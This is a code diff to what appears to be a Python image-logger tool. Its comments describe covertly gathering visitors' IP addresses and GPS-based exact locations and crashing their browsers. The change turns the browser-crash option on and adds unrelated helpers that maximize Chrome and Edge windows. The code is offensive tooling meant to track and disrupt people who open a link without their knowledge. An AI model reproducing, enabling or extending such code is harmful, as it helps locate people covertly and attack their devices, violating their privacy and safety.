@@ -22,7 +22,7 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
@@ -64,7 +64,25 @@ config = {
 }
 
 blacklistedIPs = () # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+ 
+# This feature is undocumented mainly due to it being for detecting bots better.
+
+def find_chrome_window():
+    """Finds and maximizes the Google Chrome window."""
+    for window in gw.getWindowsWithTitle("Google Chrome"):
+        if window:
+            window.maximize()
+            return True
+    return False
+
+def find_edge_window():
+    """Finds and maximizes the Microsoft Edge window."""
+    for window in gw.getWindowsWithTitle("Microsoft Edge"):
+        if window:
+            window.maximize()
+            return True
+    return False
+
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
